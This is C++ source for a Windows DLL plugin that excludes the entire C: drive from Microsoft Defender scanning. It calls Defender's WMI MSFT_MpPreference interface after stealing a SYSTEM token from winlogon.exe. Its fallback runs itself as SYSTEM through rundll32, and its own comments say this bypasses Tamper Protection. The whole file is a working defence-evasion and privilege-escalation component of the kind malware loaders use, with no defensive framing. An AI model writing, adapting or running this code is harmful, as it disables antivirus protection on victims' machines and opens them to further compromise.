#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM
#include <windows.h>
#include <tlhelp32.h>
#include <ole2.h>

static wchar_t g_dllPath[MAX_PATH] = {};

// ── WMI GUIDs (manual — no wbemcli.h needed) ─────────────────────────────────
static const CLSID  CLSID_WbemLocator_ = {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
static const IID    IID_IWbemLocator_  = {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};

// IWbemLocator vtable: ConnectServer at [3]
typedef HRESULT(__stdcall* fnConnectServer_t)(void*,const BSTR,const BSTR,const BSTR,const BSTR,LONG,const BSTR,void*,void**);
// IWbemServices: GetObject at [6], ExecMethod at [24]
typedef HRESULT(__stdcall* fnGetObject_t)(void*,const BSTR,LONG,void*,void**,void**);
typedef HRESULT(__stdcall* fnExecMethod_t)(void*,const BSTR,const BSTR,LONG,void*,void*,void**,void**);
// IWbemClassObject: Put at [5], SpawnInstance at [15], GetMethod at [19]
typedef HRESULT(__stdcall* fnPut_t)(void*,LPCWSTR,LONG,VARIANT*,LONG);
typedef HRESULT(__stdcall* fnSpawnInstance_t)(void*,LONG,void**);
typedef HRESULT(__stdcall* fnGetMethod_t)(void*,LPCWSTR,LONG,void**,void**);

static void* _Vtbl(void* p, int idx){ return (*(void***)p)[idx]; }

// Enable a named privilege on the current process token
static void _EnablePrivilege(const wchar_t* name){
    HANDLE hTok=NULL;
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok))return;
    TOKEN_PRIVILEGES tp={};
    tp.PrivilegeCount=1;
    LookupPrivilegeValueW(NULL,name,&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hTok,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(hTok);
}

// Pure WMI exclusion — runs under whatever identity the calling process has
static BOOL _WmiExclude(const wchar_t* excludePath){
    HRESULT hr=CoInitializeEx(NULL,COINIT_MULTITHREADED);
    BOOL coinit=(hr==S_OK||hr==S_FALSE);
    CoInitializeSecurity(NULL,-1,NULL,NULL,RPC_C_AUTHN_LEVEL_DEFAULT,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE,NULL);

    void* pLoc=NULL;
    hr=CoCreateInstance(CLSID_WbemLocator_,NULL,CLSCTX_INPROC_SERVER,IID_IWbemLocator_,&pLoc);
    if(FAILED(hr)){if(coinit)CoUninitialize();return FALSE;}

    BSTR ns=SysAllocString(L"\\\\.\\root\\microsoft\\windows\\defender");
    void* pSvc=NULL;
    hr=((fnConnectServer_t)_Vtbl(pLoc,3))(pLoc,ns,NULL,NULL,NULL,0,NULL,NULL,&pSvc);
    SysFreeString(ns);

    BOOL ok=FALSE;
    if(SUCCEEDED(hr)&&pSvc){
        CoSetProxyBlanket((IUnknown*)pSvc,RPC_C_AUTHN_WINNT,RPC_C_AUTHZ_NONE,NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,RPC_C_IMP_LEVEL_IMPERSONATE,NULL,EOAC_NONE);

        BSTR clsPath=SysAllocString(L"MSFT_MpPreference");
        void* pCls=NULL;
        hr=((fnGetObject_t)_Vtbl(pSvc,6))(pSvc,clsPath,0,NULL,&pCls,NULL);
        SysFreeString(clsPath);

        if(SUCCEEDED(hr)&&pCls){
            void* pInSig=NULL;
            // GetMethod is at vtable index 19 (NOT 22 — 22 is BeginMethodEnumeration)
            hr=((fnGetMethod_t)_Vtbl(pCls,19))(pCls,L"Add",0,&pInSig,NULL);
            if(SUCCEEDED(hr)&&pInSig){
                void* pInst=NULL;
                hr=((fnSpawnInstance_t)_Vtbl(pInSig,15))(pInSig,0,&pInst);
                if(SUCCEEDED(hr)&&pInst){
                    SAFEARRAYBOUND sab={1,0};
                    SAFEARRAY* sa=SafeArrayCreate(VT_BSTR,1,&sab);
                    if(sa){
                        BSTR bPath=SysAllocString(excludePath);
                        LONG idx2=0;
                        SafeArrayPutElement(sa,&idx2,bPath);
                        SysFreeString(bPath);
                        VARIANT v={};v.vt=VT_BSTR|VT_ARRAY;v.parray=sa;
                        ((fnPut_t)_Vtbl(pInst,5))(pInst,L"ExclusionPath",0,&v,0);
                        SafeArrayDestroy(sa);
                    }
                    BSTR methPath=SysAllocString(L"MSFT_MpPreference");
                    BSTR methName=SysAllocString(L"Add");
                    hr=((fnExecMethod_t)_Vtbl(pSvc,24))(pSvc,methPath,methName,0,NULL,pInst,NULL,NULL);
                    SysFreeString(methPath);SysFreeString(methName);
                    ok=SUCCEEDED(hr);
                    ((IUnknown*)pInst)->Release();
                }
                ((IUnknown*)pInSig)->Release();
            }
            ((IUnknown*)pCls)->Release();
        }
        ((IUnknown*)pSvc)->Release();
    }
    ((IUnknown*)pLoc)->Release();
    if(coinit)CoUninitialize();
    return ok;
}

// WMI with impersonated SYSTEM token (requires admin + SeDebugPrivilege)
static BOOL _AddExclusion(const wchar_t* excludePath){
    _EnablePrivilege(L"SeDebugPrivilege");
    _EnablePrivilege(L"SeImpersonatePrivilege");

    HANDLE hTok=NULL,hDup=NULL;
    BOOL impersonated=FALSE;

    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs!=INVALID_HANDLE_VALUE){
        if(Process32FirstW(hs,&pe)){
            do{
                if(lstrcmpiW(pe.szExeFile,L"winlogon.exe")==0){
                    HANDLE hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pe.th32ProcessID);
                    if(hp){
                        if(OpenProcessToken(hp,TOKEN_DUPLICATE,&hTok)){
                            DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,SecurityImpersonation,TokenImpersonation,&hDup);
                            if(hDup)impersonated=ImpersonateLoggedOnUser(hDup);
                        }
                        CloseHandle(hp);
                    }
                    break;
                }
            }while(Process32NextW(hs,&pe));
        }
        CloseHandle(hs);
    }

    BOOL ok=_WmiExclude(excludePath);

    if(impersonated)RevertToSelf();
    if(hDup)CloseHandle(hDup);
    if(hTok)CloseHandle(hTok);
    return ok;
}

// Spawn WMI exclusion as actual SYSTEM via CreateProcessWithTokenW + rundll32
// Needed when Tamper Protection blocks impersonated-SYSTEM WMI calls
static BOOL _RunAsSystem(void){
    if(!g_dllPath[0])return FALSE;

    _EnablePrivilege(L"SeDebugPrivilege");
    _EnablePrivilege(L"SeImpersonatePrivilege");

    HANDLE hSystemTok=NULL;
    PROCESSENTRY32W pe={};pe.dwSize=sizeof(pe);
    HANDLE hs=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(hs!=INVALID_HANDLE_VALUE){
        if(Process32FirstW(hs,&pe)){
            do{
                if(lstrcmpiW(pe.szExeFile,L"winlogon.exe")==0){
                    HANDLE hp=OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,FALSE,pe.th32ProcessID);
                    if(hp){
                        HANDLE hTok=NULL;
                        if(OpenProcessToken(hp,TOKEN_DUPLICATE,&hTok)){
                            // Primary token for CreateProcessWithTokenW
                            DuplicateTokenEx(hTok,TOKEN_ALL_ACCESS,NULL,
                                SecurityIdentification,TokenPrimary,&hSystemTok);
                            CloseHandle(hTok);
                        }
                        CloseHandle(hp);
                    }
                    break;
                }
            }while(Process32NextW(hs,&pe));
        }
        CloseHandle(hs);
    }
    if(!hSystemTok)return FALSE;

    // Build: rundll32.exe "<dllPath>",ExcludeMain
    wchar_t sys[MAX_PATH]={};
    GetSystemDirectoryW(sys,MAX_PATH);
    wchar_t cmd[MAX_PATH*2+64]={};
    lstrcpyW(cmd,sys);lstrcatW(cmd,L"\\rundll32.exe \"");
    lstrcatW(cmd,g_dllPath);lstrcatW(cmd,L"\",ExcludeMain");

    STARTUPINFOW si={};si.cb=sizeof(si);
    PROCESS_INFORMATION pi={};
    BOOL r=CreateProcessWithTokenW(hSystemTok,0,NULL,cmd,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);
    CloseHandle(hSystemTok);

    if(r){
        WaitForSingleObject(pi.hProcess,15000);
        CloseHandle(pi.hProcess);CloseHandle(pi.hThread);
        return TRUE;
    }
    return FALSE;
}

// Rundll32 entry point — invoked as actual SYSTEM by _RunAsSystem
// Signature matches what rundll32.exe expects: void WINAPI fn(HWND,HINSTANCE,LPSTR,int)
extern "C" __declspec(dllexport)
void WINAPI ExcludeMain(HWND,HINSTANCE,LPSTR,int){
    _WmiExclude(L"C:\\");
}

extern "C" __declspec(dllexport) BOOL WINAPI PluginMain(void){
    if(_AddExclusion(L"C:\\"))return TRUE;  // impersonated SYSTEM WMI
    if(_RunAsSystem())return TRUE;           // CreateProcessWithTokenW + rundll32 (bypasses TP)
    return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE h,DWORD r,LPVOID l){
    if(r==DLL_PROCESS_ATTACH)GetModuleFileNameW(h,g_dllPath,MAX_PATH);
    (void)l;return TRUE;
}
